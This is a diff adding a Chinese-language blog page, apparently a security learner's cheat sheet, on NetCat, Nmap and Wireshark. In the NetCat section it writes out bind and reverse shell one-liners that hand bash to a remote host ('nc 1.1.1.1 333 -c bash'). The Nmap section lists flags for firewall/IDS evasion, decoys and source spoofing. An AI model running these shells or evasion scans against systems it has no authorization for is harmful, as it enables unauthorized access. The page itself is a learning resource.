@@ -1,0 +1,1234 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>NetCat,Nmap,WireShack工具使用 - 明月归的小站</title>
+  
+    <meta name="keywords" content="NetCat,Nmap,WireShack">
+  
+
+  
+    <meta name="description" content="本篇博客主要介绍了NetCat,Nmap,WireShack三个工具使用详情！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">NetCat,Nmap,WireShack工具使用</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/">
+      NetCat,Nmap,WireShack工具使用
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年1月23日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要介绍了NetCat,Nmap,WireShack三个工具使用详情！</p>
+<a id="more"></a>
+
+<h2 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h2><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个；</span><br><span class="line">-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h：帮助；</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l：使用监听模式，监控传入的资料；</span><br><span class="line">-n：直接使用ip地址，而不通过域名服务器；</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口；</span><br><span class="line">-r：指定源端口和目的端口都进行随机的选择；</span><br><span class="line">-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址；</span><br><span class="line">-u：使用UDP传输协议；</span><br><span class="line">-v：显示指令执行过程；</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间；</span><br><span class="line">-z：使用0输入&#x2F;输出模式，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure>
+
+<h3 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h3><h4 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被控端：nc -lp 333 -c bash</span><br><span class="line">攻击端：nc 1.1.1.1 333</span><br></pre></td></tr></table></figure>
+
+<h4 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被控端：nc 1.1.1.1 333 -c bash</span><br><span class="line">攻击端：nc -lp 333</span><br></pre></td></tr></table></figure>
+
+<p>注：Windows⽤户把bash改成cmd</p>
+<h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><p>也有两种方式</p>
+<p><strong>方式1：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接收端：nc -lp 333 &gt; 1.mp4</span><br><span class="line">发送端：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>方式2：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接收端：nc -nv 1.1.1.1 333 &gt; a.mp4</span><br><span class="line">发送端：nc -q 1 -lp 333 &lt; a.mp4</span><br></pre></td></tr></table></figure>
+
+<p><strong>传输目录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发送端：tar -cvf - music/ | nc -lp 333 –q 1</span><br><span class="line">接收端：nc -nv 1.1.1.1 333 | tar -xvf -</span><br></pre></td></tr></table></figure>
+
+<p>注意有个<code>-</code></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-100</span><br></pre></td></tr></table></figure>
+
+<p>n 参数作用是跟 ip 地址，不做 dns 域名解析,v 参数是显示详细信息。z 参数就是扫描模式，默认就是 tcp 全链接扫描。</p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="Nmap-参数详解"><a href="#Nmap-参数详解" class="headerlink" title="Nmap 参数详解"></a>Nmap 参数详解</h3><p>Nmap支持主机名,ip,网段的表示方式</p>
+<p>例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-iL filename                    从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段</span><br><span class="line">-iR hostnum                     随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描</span><br><span class="line">--exclude host1[, host2]        从扫描任务中需要排除的主机           </span><br><span class="line">--exculdefile exclude_file      排除文件中的IP,格式和-iL指定扫描文件的格式相同</span><br></pre></td></tr></table></figure>
+
+<p>主机发现</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描</span><br><span class="line">-sn                     ping扫描,即主机发现</span><br><span class="line">-Pn                     不检测主机存活</span><br><span class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现</span><br><span class="line">-PE/PP/PM               使用ICMP <span class="built_in">echo</span>, timestamp and netmask 请求包发现主机</span><br><span class="line">-PO[prococol list]      使用IP协议包探测对方主机是否开启   </span><br><span class="line">-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</span><br></pre></td></tr></table></figure>
+
+<p>扫描技巧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描</span><br><span class="line">-sU                             UDP扫描</span><br><span class="line">-sN/sF/sX                       TCP Null，FIN，and Xmas扫描</span><br><span class="line">--scanflags                     自定义TCP包中的flags</span><br><span class="line">-sI zombie host[:probeport]     Idlescan</span><br><span class="line">-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描</span><br><span class="line">-sO                             使用IP protocol 扫描确定目标机支持的协议类型</span><br><span class="line">-b “FTP relay host”             使用FTP bounce scan</span><br></pre></td></tr></table></figure>
+
+<p>指定端口和扫描顺序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p                      特定的端口 -p80,443 或者 -p1-65535</span><br><span class="line">-p U:PORT               扫描udp的某个端口, -p U:53</span><br><span class="line">-F                      快速扫描模式,比默认的扫描端口还少</span><br><span class="line">-r                      不随机扫描端口,默认是随机扫描的</span><br><span class="line">--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于&#x2F;usr&#x2F;share&#x2F;nmap.nmap默认扫前1000个</span><br><span class="line">--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</span><br></pre></td></tr></table></figure>
+
+<p>服务版本识别</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测</span><br><span class="line">--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7</span><br><span class="line">--version-light                 打开轻量级模式,为--version-intensity 2的别名</span><br><span class="line">--version-all                   尝试所有探测,为--version-intensity 9的别名</span><br><span class="line">--version-trace                 显示出详细的版本侦测过程信息</span><br></pre></td></tr></table></figure>
+
+<p>脚本扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sC                             根据端口识别的服务,调用默认脚本</span><br><span class="line">--script&#x3D;”Lua scripts”          调用的脚本名</span><br><span class="line">--script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2]     调用的脚本传递的参数</span><br><span class="line">--script-args-file&#x3D;filename     使用文本传递参数</span><br><span class="line">--script-trace                  显示所有发送和接收到的数据</span><br><span class="line">--script-updatedb               更新脚本的数据库</span><br><span class="line">--script-help&#x3D;”Lua script”      显示指定脚本的帮助</span><br></pre></td></tr></table></figure>
+
+<p>OS识别</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测</span><br><span class="line">--osscan-limit  针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)</span><br><span class="line">--osscan-guess  推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</span><br></pre></td></tr></table></figure>
+
+<p>防火墙/IDS躲避和哄骗</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-f; --mtu value                 指定使用分片、指定数据包的MTU.</span><br><span class="line">-D decoy1,decoy2,ME             使用诱饵隐蔽扫描</span><br><span class="line">-S IP-ADDRESS                   源地址欺骗</span><br><span class="line">-e interface                    使用指定的接口</span><br><span class="line">-g&#x2F; --source-port PROTNUM       使用指定源端口  </span><br><span class="line">--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理 </span><br><span class="line"></span><br><span class="line">--data-length NUM               填充随机数据让数据包长度达到NUM</span><br><span class="line">--ip-options OPTIONS            使用指定的IP选项来发送数据包</span><br><span class="line">--ttl VALUE                     设置IP time-to-live域</span><br><span class="line">--spoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR  MAC地址伪装</span><br><span class="line">--badsum                        使用错误的checksum来发送数据包</span><br></pre></td></tr></table></figure>
+
+<p>Nmap 输出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-oN                     将标准输出直接写入指定的文件</span><br><span class="line">-oX                     输出xml文件</span><br><span class="line">-oS                     将所有的输出都改为大写</span><br><span class="line">-oG                     输出便于通过bash或者perl处理的格式,非xml</span><br><span class="line">-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出</span><br><span class="line">-v                      提高输出信息的详细度</span><br><span class="line">-d level                设置debug级别,最高是9</span><br><span class="line">--reason                显示端口处于带确认状态的原因</span><br><span class="line">--open                  只输出端口状态为open的端口</span><br><span class="line">--packet-trace          显示所有发送或者接收到的数据包</span><br><span class="line">--iflist                显示路由信息和接口,便于调试</span><br><span class="line">--log-errors            把日志等级为errors&#x2F;warings的日志输出</span><br><span class="line">--append-output         追加到指定的文件</span><br><span class="line">--resume FILENAME       恢复已停止的扫描</span><br><span class="line">--stylesheet PATH&#x2F;URL   设置XSL样式表，转换XML输出</span><br><span class="line">--webxml                从namp.org得到XML的样式</span><br><span class="line">--no-sytlesheet         忽略XML声明的XSL样式表</span><br></pre></td></tr></table></figure>
+
+<p>其他nmap选项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-6                      开启IPv6</span><br><span class="line">-A                      OS识别,版本探测,脚本扫描和traceroute</span><br><span class="line">--datedir DIRNAME       说明用户Nmap数据文件位置</span><br><span class="line">--send-eth &#x2F; --send-ip  使用原以太网帧发送&#x2F;在原IP层发送</span><br><span class="line">--privileged            假定用户具有全部权限</span><br><span class="line">--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限</span><br><span class="line">-V                      打印版本信息</span><br><span class="line">-h                      输出帮助</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h3><ul>
+<li>open：确定端口开放，可达</li>
+<li>closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</li>
+<li>filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</li>
+<li>unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</li>
+<li>open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。</li>
+<li>closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</li>
+</ul>
+<h3 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h3><ul>
+<li>-sS/sT/sA/sW/sM:TCP扫描<ul>
+<li>S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放</li>
+<li>T是全连接扫描会和服务器建立完整的三次握手，效率低</li>
+<li>A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件</li>
+<li>W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包</li>
+<li>M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准</li>
+</ul>
+</li>
+<li>-sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文</li>
+<li>-sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。</li>
+<li>–scanflags &lt;flags&gt;：实现上同上面几种类似，可以让用户自定义TCP标志位。</li>
+<li>-sI &lt;zombie host[:probeport]&gt;: Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1.</li>
+<li>-sY/sZ:SCTP协议INIT或cookie-echo扫描</li>
+<li>-sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测</li>
+<li>-b &lt;FTP relay host&gt;:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的</li>
+</ul>
+<h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mq0036/p/11187138.html">https://www.cnblogs.com/mq0036/p/11187138.html</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/>http://www.m00nback.xyz/2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-02-04T22:14:35+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年2月4日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/NetCat/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>NetCat</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Nmap/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Nmap</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/WireShack/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>WireShack</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/&title=NetCat,Nmap,WireShack工具使用 - 明月归的小站&summary=本篇博客主要介绍了NetCat,Nmap,WireShack三个工具使用详情！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/&title=NetCat,Nmap,WireShack工具使用 - 明月归的小站&summary=本篇博客主要介绍了NetCat,Nmap,WireShack三个工具使用详情！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2020/01/23/nc-nmap%E5%92%8Cwireshack%E4%BD%BF%E7%94%A8/&title=NetCat,Nmap,WireShack工具使用 - 明月归的小站&summary=本篇博客主要介绍了NetCat,Nmap,WireShack三个工具使用详情！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/01/23/HGAME%E6%AF%94%E8%B5%9B%E9%83%A8%E5%88%86writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>HGAME2020比赛部分writeup</p>
+                <p class='content'>本篇博客记录了HGAME上web题目和misc题目的writeup！
+
+
+Week1webCosmos 的博客打开提示github，还着重标了版本管理工具，git源码泄露也没恢复出神魔有用的东西...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/'>
+                <p class='title'>PHP的字符串解析特性<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
